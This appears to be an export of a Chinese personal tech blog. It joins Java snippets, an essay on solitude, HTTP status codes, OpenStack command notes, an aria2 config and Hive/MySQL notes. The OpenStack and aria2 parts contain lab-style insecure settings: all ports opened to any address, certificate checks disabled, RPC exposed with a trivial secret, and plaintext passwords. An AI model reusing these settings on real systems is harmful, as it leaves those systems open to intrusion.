获取环境变量 for (String s : getenv.keySet()) { System.out.println(s + \u0026#34;=\u0026#34; + getenv.get(s)); } ------------------------------------------------------- val list = ScriptEngineManager().engineFactories 查看已经安装的脚本引擎 list.forEach { println(it.engineName + \u0026#34; :: \u0026#34; + it.engineVersion) println(it.languageName + \u0026#34; :: \u0026#34; + it.languageVersion) println(it.scriptEngine) println(it.extensions) println(it.mimeTypes) println(it.names) } ---- 输出： Oracle Nashorn :: 1.8.0_112 ECMAScript :: ECMA - 262 Edition 5.1 jdk.nashorn.api.scripting.NashornScriptEngine@6c3708b3 [js] [application/javascript, application/ecmascript, text/javascript, text/ecmascript] [nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript] ------------------------------------------------------- GraphicsEnvironment graphicsEnvironment = GraphicsEnvironment.getLocalGraphicsEnvironment(); String[] familyNames = graphicsEnvironment.getAvailableFontFamilyNames(); 获取所有字体系列名称 int i = 0; for (String s : familyNames) { System.out.println(++i + \u0026#34;：\u0026#34; + s); } Font[] fonts = graphicsEnvironment.getAllFonts(); 获取所有字体 i = 0; for (Font font : fonts) { System.out.println(++i + \u0026#34;：\u0026#34; + font); } ------------------------------------------------------- int i = 5; while (i --\u0026gt; 0) { 5 先与 0 比较，之后再自减 1 //while (i-- \u0026gt; 0) { System.out.println(i); } ---- 输出： 4 3 2 1 0 ------------------------------------------------------- private static String formatFileSize(long size) { 格式化文件大小 NumberFormat numberFormat = NumberFormat.getInstance(); numberFormat.setMaximumFractionDigits(1); numberFormat.setMinimumFractionDigits(1); int divisor; String unit; if (size \u0026gt; (divisor = 1024 * 1024 * 1024)) { unit = \u0026#34;GB\u0026#34;; } else if (size \u0026gt; (divisor /= 1024)) { unit = \u0026#34;MB\u0026#34;; } else if (size \u0026gt; (divisor /= 1024)) { unit = \u0026#34;KB\u0026#34;; } else { divisor /= 1024; unit = \u0026#34;B\u0026#34;; } return numberFormat.format(size * 1.0 / divisor) + \u0026#34; \u0026#34; + unit; } ------------------------------------------------------- 布尔集合 ---- BitSet set = new BitSet(); set.set(0); set.set(1); set.set(2); set.set(5, false); set.set(6, true); set.set(7, true); set.flip(6); 反转 System.out.println(set); System.out.println(set.cardinality()); 真值数量 System.out.println(set.length()); 从最开始到最后 1(true) 位的位置的长度 System.out.println(set.size()); 总数量 for (int i = set.nextSetBit(0); i \u0026gt;= 0; i = set.nextSetBit(i + 1)) { System.out.printf(\u0026#34;%d \u0026#34;, i); } ---- 输出： {0, 1, 2, 7} 4 8 64 0 1 2 7 判断字符串使用了哪些字符 ---- String str = \u0026#34;How do you do\u0026#34;; BitSet set = new BitSet(); for (char c : str.toCharArray()) { set.set(c); } set.clear(32); //将空格置为 false for (int i = set.nextSetBit(0); i \u0026gt;= 0; i = set.nextSetBit(i + 1)) { System.out.print((char) i); } ---- 输出： Hdouwy 判断有几组成对数字 ---- int[] ints = {1, 2, 2, 1, 1, 3, 5, 1, 2, 3}; int pair = 0; BitSet set = new BitSet(); for (int i : ints) { if (set.get(i)) { pair++; } set.flip(i); } System.out.println(set); 落单数字 System.out.println(pair); 成对数字组数 ---- 输出： {2, 5} 4 继承初始化执行顺序 class Test1 { static { System.out.println(\u0026#34;1父类静态初始化块\u0026#34;); } { System.out.println(\u0026#34;2父类初始化块\u0026#34;); } Test1() { System.out.println(\u0026#34;3父类构造方法\u0026#34;); } } ---- class Test2 extends Test1 { static { System.out.println(\u0026#34;1子类静态初始化块\u0026#34;); } { System.out.println(\u0026#34;2子类初始化块\u0026#34;); } Test2() { System.out.println(\u0026#34;3子类构造方法\u0026#34;); } } ---- class Initial { public static void main(String[] args) { Test1 a = new Test2(); } } ---- 输出： 1父类静态初始化块 1子类静态初始化块 2父类初始化块 3父类构造方法 2子类初始化块 3子类构造方法 装箱和拆箱 装箱：把基本类型转换为包装类，使其具有对象的性质，分为手动装箱和自动装箱。 拆箱：和装箱相反，把包装类对象转换为基本类型的值，分为手动拆箱和自动拆箱。 int i = 5; ---- Integer x = new Integer(i); 手动装箱 Integer y = i; 自动装箱 Integer j = new Integer(10); ---- int m = j.intValue(); 手动拆箱 int n = j; 自动拆箱 \u0026lt;!-- pom.xml maven mirrors --\u0026gt; \u0026lt;repositories\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;repo1\u0026lt;/id\u0026gt; \u0026lt;url\u0026gt;https://mirrors.huaweicloud.com/repository/maven/\u0026lt;/url\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;/repositories\u0026gt; \u0026lt;pluginRepositories\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;repo1\u0026lt;/id\u0026gt; \u0026lt;url\u0026gt;https://mirrors.huaweicloud.com/repository/maven/\u0026lt;/url\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;/pluginRepositories\u0026gt; ","permalink":"https://xhstormr.github.io/blog/posts/java/","summary":"","title":"自学 Java"},{"content":"Updated on 2016-05-27\n一个人的自身拥有越多，那么，别人能够给予他的也就越少。 因为在独处的时候，一个可怜虫就会感受到自己的全部可怜之处，而一个具有丰富思想的人只会感觉到自己丰富的思想。一言以蔽之：一个人只会感觉到自己的自身。 只有当一个人独处的时候，他才可以完全成为自己。谁要是不热爱独处，那他也就是不热爱自由，因为只有当一个人独处的时候，他才是自由的。——叔本华《关于独处》\n我可以早上六点起床，\n锅里熬着粥，\n去晨跑40分钟。\n我可以把房间打扫得一尘不染，\n所有东西整理得规规矩矩，\n悠闲地做顿饭。\n饭后我可以看一部好看的电影，\n或者写篇日记。\n一个人的日子，\n时间很多，\n可以做很多事。\n低质量的社交，\n不如高质量的独处。\n无人与我立黄昏，\n无人问我粥可温。\n偶尔羡慕情侣，\n偶尔庆幸自由。\n手机不离手，\n耳机不离耳，\n孤独不离身。\n你本周听歌3550分钟，\n超过了98％的好友。\n不用为了合群而浪费时间。\n与人为善是教养，\n独来独往是性格。\n比两人行潇洒，\n比三人行自由。\n你试过一个人签字做手术吗？\n我可以一个人吃火锅，\n一个人看电影，\n一个人去KTV，\n一个人去医院。\n我一个人也很好，\n不需要有人陪，\n但是没人知道我在撒谎。\n一个人久了会上瘾。\n别人手机相册都是合照，\n我的除了风景照就剩表情包了。\n别人稍微对我好一点，\n就以为人家喜欢你了。\n别人让你帮忙你会欣然答应，\n你需要别人帮忙的时候却难以开口。\n担心结婚的时候，\n没有同学朋友到场。\n每个人的心里都有一团火，\n路过的人只能看到烟。\n孤独是你看到的，\n享受是我自己的。\n我其实并不孤僻，\n甚至可以说开朗活泼。\n但大多时候我很懒，\n懒得经营一个关系。\n还有一些时候，\n就是爱自由，\n觉得任何一种关系\n都会束缚自己。\n当然最主要的，\n还是知音难寻。\n我老觉得自己跟大多数人交往，\n总是只能拿出自己的一个维度，\n很难找到一个像我一样\n兴趣一望无际的人。\n- EOF -\n","permalink":"https://xhstormr.github.io/blog/posts/loner/","summary":"","title":"Loner"},{"content":"Updated on 2016-05-13\nW3C | Wikipedia | IETF | HTTPStatus\n我把 HTTP 状态码按其类型整理在这里，以便查阅。\n1xx 临时响应 表示临时响应并需要请求者继续执行操作\n100 继续 - 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。\n101 切换协议 - 请求者已要求服务器切换协议，服务器已确认并准备切换。\n2xx 成功 表示成功处理了请求\n200 正常 - 服务器成功处理了请求。\n201 已创建 - 请求成功并且服务器创建了新的资源。\n202 已接受 - 服务器已接受请求，但尚未处理。\n203 非授权信息 - 服务器成功处理了请求，但返回的信息可能来自另一来源。\n204 无内容 - 服务器成功处理了请求，但没有返回任何内容。\n205 重置内容 - 服务器成功处理了请求，但没有返回任何内容，并要求请求者重置文档视图。\n206 部分内容 - 服务器成功处理了部分 GET 请求。\n3xx 重定向 表示要完成请求，需要进一步操作\n300 多种选择 - 针对请求，服务器可执行多种操作，或提供操作列表供请求者选择。\n301 永久移动 - 请求的网页已永久移动到新位置，会自动将请求者转到新位置。\n302 临时移动 - 服务器目前从不同位置的网页响应请求，会自动将请求者转到不同的位置。\n303 查看其他位置 - 请求者应当对不同的位置使用单独的 GET 请求来检索响应时。\n304 未修改 - 自从上次请求后，请求的网页未修改过，不会返回网页内容。\n305 使用代理 - 请求者只能使用代理访问请求的网页，表示请求者应使用代理。\n307 临时重定向 - 服务器目前从不同位置的网页响应请求，会自动将请求者转到不同的位置。\n4xx 请求错误 表示请求出错，妨碍了服务器的处理\n400 错误请求 - 服务器不理解请求的语法。\n401 未授权 - 请求要求身份验证。\n403 禁止 - 服务器拒绝请求。\n404 未找到 - 服务器找不到请求的网页。\n405 方法禁用 - 禁用请求中指定的方法。\n406 不接受 - 无法使用请求的内容特性响应请求的网页。\n407 需要代理授权 - 请求者应当授权使用代理。\n408 请求超时 - 服务器等候请求时发生超时。\n409 冲突 - 服务器在完成请求时发生冲突。\n410 已删除 - 请求的资源已永久删除，有时会用来替代 404 代码。\n411 需要有效长度 - 服务器不接受不含有效内容长度标头字段的请求。\n412 未满足前提条件 - 服务器未满足请求者在请求中设置的其中一个前提条件。\n413 请求实体过大 - 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。\n414 请求的 URI 过长 - 请求的 URI 过长，服务器无法处理。\n415 不支持的媒体类型 - 请求的格式不受请求页面的支持。\n416 请求范围不符合要求 - 页面无法提供请求的范围。\n417 未满足期望值 - 服务器未满足 \u0026ldquo;期望\u0026rdquo; 请求标头字段的要求。\n5xx 服务器错误 表示服务器在处理请求时发生内部错误\n500 服务器内部错误 - 服务器遇到错误，无法完成请求。\n501 尚未实施 - 服务器不具备完成请求的功能。\n502 错误网关 - 服务器作为网关或代理，从上游服务器收到无效响应。\n503 服务不可用 - 由于超载或停机维护服务器目前无法使用。\n504 网关超时 - 服务器作为网关或代理，没有及时从上游服务器收到请求。\n505 HTTP 版本不受支持 - 服务器不支持请求中所用的 HTTP 协议版本。\n","permalink":"https://xhstormr.github.io/blog/posts/http-status-code/","summary":"","title":"HTTP Status Code"},{"content":"Updated on 2016-10-06\ncurl - 命令行浏览器 OpenStack 服务提供 RESTful API，而 curl 能通过命令行直接发送和接收 HTTP 的请求和响应\n-X [HEAD,POST,GET,PUT,DELETE] # 指定 HTTP 的请求类型 Request -H \u0026#34;name:123\u0026#34; #添加 HTTP 请求头 Header -D [123,-] #将 HTTP 响应头输出到[文件,终端] Dump -i #同时显示 HTTP 响应头 Include -I #只显示文档信息 Head -u admin:pass #登录验证 User -k #忽略主机密钥（SSL 证书） Insecure -s #不显示进度条 Silent -v #显示详细信息 Verbose -d @123.json #指定 POST 数据包 Data -F file=@123.png #指定表单数据 Form ------------------------------------------------------- -A \u0026#34;Mozilla/5.0 (Linux; Android 5.1.1; Nexus 6 Build/LYZ28E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.20 Mobile Safari/537.36\u0026#34; #指定 User-Agent -e \u0026#34;www.qq.com\u0026#34; #指定 Referrer URL -x 10.34.3.71:808 #指定代理服务器 -o \u0026#34;123.7z\u0026#34; #保存至本地 -O #使用服务器上的文件名 -R #使用服务器上的文件修改时间 -b \u0026#34;NAME1=VALUE1; NAME2=VALUE2\u0026#34; #设置 Cookie -b 123.txt #读取 Cookie -c 123.txt #保存 Cookie -C - #断点续传 Continue -L #自动重定向 Location --limit-rate 200K #限速 https://curl.haxx.se/windows/ https://curl.haxx.se/docs/manpage.html curl -s -H \u0026#34;X-Auth-Token:123\u0026#34; http://0.0.0.0:35357/v2.0/tenants | python -mjson.tool #格式化输出 JSON [root@controller ~]$ a=`keystone token-get | awk \u0026#39;NR==5{print $4}\u0026#39;` [root@controller ~]$ echo $a [root@controller ~]$ curl -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:35357/v2.0/tenants ------------------------------------------------------- [root@controller ~]$ keystone --debug tenant-list v2.0 [root@controller ~]$ glance --debug image-list v1 [root@controller ~]$ nova --debug list v2 ------------------------------------------------------- keystone catalog nova endpoints ------------------------------------------------------- openstack-status openstack-service restart KEYSTONE keystone token-get | awk \u0026#39;NR==5{print $4}\u0026#39; 获取 Token 第5行第4列 nova endpoints | grep -A 7 keystone 获取 Endpoint 35357 curl -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:35357/v2.0/users 返回用户 curl -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:35357/v2.0/users/123 返回某个用户 curl -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:35357/v2.0/tenants 返回租户 curl -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:35357/v2.0/tenants/123 返回某个租户 curl -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:35357/v2.0/tenants/123/users/123/roles 返回某个租户上用户被授予的角色 curl -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:35357/v2.0/endpoints 返回服务端点 curl -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:35357/v2.0/tokens/$a 检验 Token 有效性，并返回 Token 信息 curl -I -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:35357/v2.0/tokens/$a 使用 Header 校验 Token 有效性 ------------------------------------------------------- keystone user-role-list --user 123 --tenant admin 查看用户在某个租户中的角色 keystone --os-token 123 --os-endpoint http://0.0.0.0:35357/v2.0 user-role-add --user admin --role admin --tenant admin 使用 Token 鉴权 keystone.conf - admin_token = 123 Token 验证 export OS_SERVICE_TOKEN=cacb79002f export OS_SERVICE_ENDPOINT=http://0.0.0.0:35357/v2.0 ----------- Password 验证 export OS_USERNAME=admin export OS_PASSWORD=000000 export OS_TENANT_NAME=admin export OS_AUTH_URL=http://0.0.0.0:35357/v2.0 GLANCE keystone token-get | awk \u0026#39;NR==5{print $4}\u0026#39; 获取 Token 第5行第4列 nova endpoints | grep -A 7 glance 获取 Endpoint 9292 curl -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:9292/v1/images 返回镜像列表 curl -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:9292/v1/images/detail 返回镜像列表(详细) curl -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:9292/v1/images/detail?name=centos 返回某个镜像的详细信息 curl -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:9292/v2/images 返回镜像列表(详细) curl -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:9292/v2/images/123 返回某个镜像的详细信息 curl -I -X HEAD -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:9292/v1/images/123 返回某个镜像的 Metadata curl -X GET -H \u0026#34;X-Auth-Token:$a\u0026#34; http://0.0.0.0:9292/v1/images/123 \u0026gt; test.img 下载某个镜像 ------------------------------------------------------- glance image-create --name centos6.5 --disk-format qcow2 --container-format bare --is-public True --progress \u0026lt; centos_65_x86_6420140327.qcow2 上传镜像 glance image-update centos6.5 --property hw_disk_bus=scsi --property hw_scsi_model=virtio-scsi 更新镜像 glance image-update centos6.5 --name centos6.5_scsi 更新镜像 Property： hw_disk_bus=scsi hw_scsi_model=virtio-scsi hw_cdrom_bus=ide ------------------------------------------------------- CirrOS https://download.cirros-cloud.net/ user:cirros password:gocubsgo glance image-create --name cirros --disk-format qcow2 --container-format bare \u0026lt; cirros-0.3.4-x86_64-disk.img NOVA nova secgroup-list 列出安全组 nova secgroup-list-rules default 查看安全组 nova secgroup-add-rule default tcp 1 65535 0.0.0.0/0 添加规则 nova secgroup-add-rule default udp 1 65535 0.0.0.0/0 添加规则 nova secgroup-add-rule default icmp -1 -1 0.0.0.0/0 添加规则 ------------------------------------------------------- nova keypair-list 列出密钥对 nova keypair-add 123 \u0026gt; 123.priv 创建密钥对 nova keypair-add --pub-key /root/.ssh/id_rsa.pub 123 添加密钥对 事先已做 ssh-keygen ------------------------------------------------------- nova flavor-list 列出 VM 类型 nova flavor-create 123 auto 1024 20 1 创建 VM 类型 名称 编号 内存 磁盘 内核 ------------------------------------------------------- nova boot --flavor m1.small --image centos6.5 --nic net-id=17589f7c-0504-4485-8c13-53f1b306eab1 123 创建实例 nova list 列出实例 virsh list --all nova show 123 查看实例 nova suspend 123 暂停实例 nova resume 123 恢复实例 nova start 123 启动实例 nova stop 123 停止实例 nova reboot 123 重启实例 nova delete 123 终止实例 nova rename 123 swift 重命名实例 nova image-create 123 snapshot1 为实例创建快照 nova console-log 123 查看启动日志 nova get-vnc-console 123 novnc 获取 VNC URL，通过游览器访问 nova usage-list 列出平台资源使用情况 nova hypervisor-stats 列出虚拟机监控器统计数据 ------------------------------------------------------- nova volume-list 列出云硬盘 CINDER nova volume-show test 显示云硬盘 CINDER nova volume-create --display-name test 1 创建云硬盘 CINDER nova volume-attach 123 5495c0aa-896d-4a50-b40f-3a0730cd6a64 为实例挂载云硬盘 CINDER nova volume-detach 123 5495c0aa-896d-4a50-b40f-3a0730cd6a64 为实例断开云硬盘 CINDER ------------------------------------------------------- nova floating-ip-pool-list 列出浮动 IP 池(外部网络) GRE网络 nova floating-ip-list 列出获取的浮动 IP GRE网络 nova floating-ip-create ext 获取浮动 IP GRE网络 nova floating-ip-associate 123 192.168.200.105 关联浮动 IP GRE网络 CINDER 3：MySQL+KEYSTONE+CINDER ------------------------------------------------------- SWIFT 3：MySQL+KEYSTONE+SWIFT ------------------------------------------------------- swift-init all restart 重新启动所有 SWIFT 服务 swift -U 1:1 -K 1 -V 2 -A http://0.0.0.0:35357/v2.0 stat 查看特定用户信息 swift --os-username=1 --os-password=1 --os-tenant-name=1 --os-auth-url=http://0.0.0.0:35357/v2.0 stat 查看特定用户信息 Heat heat stack-list 列出栈 heat stack-create -f server.yml -P ImageID=centos6.5 -P NetID=int mystack 创建栈 heat event-list mystack 查看栈的事件日志 heat event-show mystack server1 d9c12983-d4df-42ad-bd01-350c9b8abfd6 查看事件日志的详细信息 Ceilometer ceilometer meter-list 查看所有测量值 ceilometer resource-list 查看所有资源 ceilometer resource-show -r a3f74bc8-8200-4345-9f07-fa4aae11567d 查看资源详情 Sahara ssh cloud-user@192.168.200.104 sudo passwd root #修改 root 密码 su #转到 root 用户 passwd cloud-user #修改 cloud-user 密码 passwd hadoop #修改 hadoop 密码 su hadoop #转到 hadoop 用户 jps #查看 Hadoop 进程，开始 Hadoop 操作 \u0026gt;\u0026gt;\u0026gt; GLANCE 使用未加 SCSI 属性的镜像创建的VM - virtio-blk\n使用已加 SCSI 属性的镜像创建的VM - virtio-scsi（更灵活、更具扩展性）\n","permalink":"https://xhstormr.github.io/blog/posts/openstack-operations/","summary":"","title":"OpenStack 不完全使用手册"},{"content":"Updated on 2016-05-26\nhttps://www.openstack.org/\nhttp://docs.openstack.org/\n概念架构 (Conceptual Architecture)\n逻辑架构 (Logical Architecture)\nOpenStack is a cloud operating system that controls large pools of compute, storage, and networking resources throughout a datacenter, all managed through a dashboard that gives administrators control while empowering their users to provision resources through a web interface.\nOpenStack，1化N，通过虚拟化的方式提供灵活高利用率的计算能力。\nHadoop，N化1，通过分布式文件系统解决单台大机器无法解决的计算和存储问题。\nProjects Core Services (6) NAME SERVICE KEYSTONE Identity 认证* GLANCE Image 镜像* NOVA Compute 计算* NEUTRON Networking 网络* CINDER Block Storage 块存储 SWIFT Object Storage 对象存储 \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; Optional Services (13) NAME SERVICE Horizon Dashboard 面板* Heat Orchestration 编配 Ceilometer Telemetry 监控 Sahara Elastic Map Reduce 大数据部署 \u0026hellip;\u0026hellip;. \u0026hellip;\u0026hellip;. \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; 注 * 为本人必须安装项 KEYSTONE Keystone：一个公司的安全部门 Authentication(认证) 和 Authorization(授权) 管理用户及其权限 维护 Service 的 Endpoint Tenant：安全部门的多个办公室 也叫 Project，将 OpenStack 的资源进行分组和隔离，是各个服务中的一些可以访问的资源集合 资源所有权属于 Project，而不是 User 所有 User 必须挂在 Project 里才能使用并且共享该 Project 里的资源 User：在办公室上班的员工 User 指代任何使用 OpenStack 的实体，可以是用户或程序 User 可以属于多个 Project，针对每个 Project，User 拥有一个角色(Role) Role：安全部门内的各种权限 - Authorization(授权) 可以为 User 分配多个 Role OpenStack 默认定义了 2 种角色 member：典型用户 admin：超级管理用户，对所有 Project 都有完全的权限，相当于 root Service：被安全部门认可的职能 Service 通过 Endpoint 暴露自己的 API Service 通过policy.json决定每个 Role 能做什么事 policy.json默认只区分admin和非adminRole；若要对特定 Role 进行授权，需要修改policy.json Endpoint：职能办公室的入口 User 通过 Endpoint 访问资源和执行操作 Endpoint 包含 3 种 URL publicURL，可以被全局访问，外网普通服务入口 eg.http://controller:5000/v2.0 internalURL，只能被局域网访问，内网普通服务入口 eg.http://controller:5000/v2.0 adminURL，被从常规的访问中分离，内网管理员入口 eg.http://controller:35357/v2.0 Keystone 分业务端口(5000)和管理端口(35357) Token：访问职能办公室的钥匙 User 成功认证后由 Keystone 分配的字符串 - Authentication(认证) 在与其他服务交互中只需要携带 Token 即可，Token 有效期默认为 24 小时 [root@controller ~]$ ps -e | grep keystone 2385 ? 00:01:14 keystone-all GLANCE glance-api：对外提供 REST API，响应 Image 查询、获取和存储的调用 glance-api 不会真正处理请求 关于 Image Metadata 的相关操作，请求转发给 glance-registry 关于 Image 自身获取的相关操作，请求转发给该 Image 的 Store backend glance-registry：负责处理和存取 Image 的 Metadata 到 Database 中 Glance 支持多种格式的 Image Image 的 Metadata 会存储在 Database 中，默认是 MySQL \u0026gt; glance Store backend：Glance 自己并不存储 Image，真正的 Image 存放在 backed 中 Glance 支持多种 backed，默认是Local File System，存储在/var/lib/glance/images中 除了上图列举出的 backed，还有 GridFS、Ceph、Sheepdog、VMware ESX \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\n[root@controller ~]$ ps -e | grep glance | sort -uk 4 2089 ? 00:00:00 glance-api 2308 ? 00:00:00 glance-registry NOVA nova-api：接收和响应客户的 API 调用 nova-scheduler：虚拟机调度服务，负责决定在哪个计算节点上运行虚拟机 nova-compute：管理虚拟机的核心服务，通过调用 Hypervisor API 实现虚拟机生命周期管理 nova-conductor：代替 nova-compute 访问数据库 nova-consoleauth：负责对访问虚拟机控制台请求提供 Token 认证 nova-console：用户可以通过多种方式访问虚拟机的控制台 nova-novncproxy：基于 Web 浏览器的 VNC 访问 nova-spicehtml5proxy：基于 HTML5 浏览器的 SPICE 访问 nova-xvpnvncproxy：基于 Java 客户端的 VNC 访问 nova-cert：提供 x509 证书支持 Message Queue(消息队列)：子服务的信息中转站 - Qpid Database：MySQL * 我采取的是双节点 [root@controller ~]$ ps -e | grep nova | sort -uk 4 2427 ? 00:01:42 nova-api 2435 ? 00:00:07 nova-cert 2443 ? 00:01:40 nova-conductor 2451 ? 00:00:07 nova-consoleaut 2459 ? 00:00:02 nova-novncproxy #nova-console 2467 ? 00:00:07 nova-scheduler [root@compute ~]$ ps -e | grep nova | sort -uk 4 2173 ? 00:01:53 nova-compute ","permalink":"https://xhstormr.github.io/blog/posts/openstack/","summary":"","title":"自学 OpenStack"},{"content":"Updated on 2016-08-23\nhttps://github.com/aria2/aria2\naria2 is a lightweight multi-protocol \u0026amp; multi-source command-line download utility. It supports HTTP/HTTPS, FTP, SFTP, BitTorrent and Metalink. aria2 can be manipulated via built-in JSON-RPC and XML-RPC interfaces.The next generation download utility.\n我把我自定义的 Aria2 整理在这里，以便查阅。\ndir=D:\\Download disk-cache=32M enable-mmap=true max-mmap-limit=2048M file-allocation=falloc continue=true max-concurrent-downloads=3 max-connection-per-server=10 min-split-size=5M split=10 disable-ipv6=true input-file=aria2.session save-session=aria2.session save-session-interval=60 listen-port=51413 enable-dht=true bt-enable-lpd=true follow-torrent=true http-no-cache=true check-certificate=false seed-time=0 max-overall-upload-limit=10K remote-time=true content-disposition-default-utf8=true user-agent=Windows referer=https://www.bilibili.com/ bt-tracker=udp://93.158.213.92:1337/announce,udp://45.154.253.7:6969/announce enable-rpc=true rpc-listen-all=true rpc-allow-origin-all=true rpc-secret=123456 # ws://token:123456@127.0.0.1:6800/jsonrpc YAAW Header ⇳ Cookie: abcd https://github.com/ngosang/trackerslist ---- curl https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_best_ip.txt | busybox awk NF | busybox paste -d , -s \u0026gt; 123.txt ---- bt-tracker=udp://62.138.0.158:6969/announce,udp://188.241.58.209:6969/announce,udp://93.158.213.92:1337/announce,udp://80.209.252.132:1337/announce,udp://62.210.97.59:1337/announce,udp://151.80.120.112:2710/announce,udp://151.80.120.114:2710/announce,udp://165.231.0.116:80/announce,udp://208.83.20.20:6969/announce,udp://5.206.3.65:6969/announce,udp://89.234.156.205:451/announce,udp://35.156.19.129:6969/announce,udp://159.100.245.181:6969/announce,udp://37.235.174.46:2710/announce,udp://185.181.60.67:80/announce,udp://78.142.18.55:1337/announce,udp://78.142.18.61:6969/announce,udp://51.15.40.114:80/announce,udp://184.105.151.164:6969/announce,udp://176.113.71.19:6961/announce ","permalink":"https://xhstormr.github.io/blog/posts/aria2/","summary":"","title":"Aria2 Configuration"},{"content":"Updated on 2016-06-08\nhttps://hive.apache.org/\nHive 是 SQL 解析引擎，它将 SQL 语句转译成 Map/Reduce Job 然后在 Hadoop 执行；能够用类 SQL 的方式操作 HDFS 里面数据一个数据仓库的框架，这个类 SQL 我们称之为 HQL（Hive Query Language）。\nHive 概念 Hive 的数据存储基于 HDFS Hive 中的表\u0026mdash;HDFS 里的目录 Hive 中的表的数据\u0026mdash;HDFS 目录下的文件 Hive 中的行列\u0026mdash;HDFS 文件中的行列 Hive 的用户接口有三个：Shell、Web、JDBC/ODBC。 Hive 将元数据存储在数据库中（MetaStore），只支持 MySQL、Derby（默认，一次只能打开一个会话，不推荐）作为存储引擎；元数据包括表的名字、列、分区、是否为外部表以及数据所在目录等。 Hive 的数据存储在 HDFS 中，大部分的查询由 MapReduce 完成。（包含 * 查询，但 select * from table 不会生成 MapReduce 任务） Hive 中的解释器、编译器、优化器完成 HQL 查询语句并生成查询计划；生成的查询计划存储在 HDFS 中，并随后由 MapReduce 调用执行，Hadoop 监控作业执行过程，然后返回作业执行结果给用户。（简单来说就是把类 SQL 语句转化为 MapReduce 任务运行，高延迟） Hive 在导入数据过程中不会对数据做任何修改，只是将数据移至 HDFS 目录中，所有数据都是在导入时确定。（纯移动/复制操作） 因此 Hive 并不提供实时的查询和基于行级的数据更新操作，不适合联机事务处理（低延迟）。 Hive 没有定义专门的数据格式，因此创建表时，指定Hive数据的列分隔符与行分隔符，Hive即可解析数据。 列分割符:\u0026rsquo;,\u0026rsquo; \u0026lsquo;\\t\u0026rsquo;(TAB) \u0026lsquo;\\040\u0026rsquo;(空格) [ASCII码表] 行分隔符: \u0026lsquo;\\n\u0026rsquo;(ENTER) 文件格式：TextFile(数据是纯文本)、SequenceFile(若需要压缩) Hive 中的数据模型有4种：Table(内部表)、Partition(分区表)、External Table(外部表)、Bucket(桶表) Hive 操作 create database db1; 创建数据库 show databases; 显示数据库 use db1; 切换至 db1 数据库 create table a1(id int,name string) row format delimited fileds terminated by \u0026#39;\\t\u0026#39; [stored as textfile]; 创建表并以 TAB 键分割[并存储为纯文本] create table a1(id int,name string) partitioned by (p string) row format delimited fileds terminated by \u0026#39;\\t\u0026#39;; 创建分区表分区字段`p`并以 TAB 键分割 show tables; 显示表名 show partitions a1; 查看表分区 desc a1; 查看表结构 load data [local] inpath \u0026#39;/root/1.txt\u0026#39; [overwrite] into table a1; 导入数据[覆盖]至表中，`local` 表示本地路径 load data [local] inpath \u0026#39;/root/1.txt\u0026#39; [overwrite] into table a1 partition (p=\u0026#39;1\u0026#39;); 导入数据[覆盖]至表中，并分区至1文件夹中(需为分区表) select * from a1; 查询表所有数据 select count(*) from a1; 运行 MapReduce 计算有多少行数据 drop table a1; 删除表 drop database db1; 删除数据库 alter table a1 add columns (age int,date string); 添加2列新字段 alter table a1 replace columns (id int); 替换表中所有字段 alter table a1 rename to a2; 更改表名 create table a1bak like a1; 创建表并复制表结构 create table a1(id int,name string) row format delimited fileds terminated by \u0026#39;\\040\u0026#39; location \u0026#39;/123\u0026#39;; 创建表并指定存放位置 dfs -put /root/1.txt /123; 直接上传代替 LOAD 操作 select * from a1; 查询表所有数据 !ls -l; 执行外部命令 dfs -ls /; 执行 dfs 命令 Hive 的历史命令存放在 ~/.hivehistory MySQL 操作 mysql -uroot -p000000 登录 MySQL show databases; 显示数据库 create database a1; 创建数据库 use a1; 切换至 a1 数据库 show tables; 显示表名 create table b1(id int(4),name varchar(20),sex char(1)); 创建表 desc b1; 查看表结构 insert into b1 values (1234,\u0026#39;xiaoming\u0026#39;,\u0026#39;m\u0026#39;); 插入数据 select * from b1; 查询数据 select user,host,password from mysql.user \\G; 查询 mysql.user 表数据并以组排列 delete from b1; 删除表中所有数据 delete from b1 where 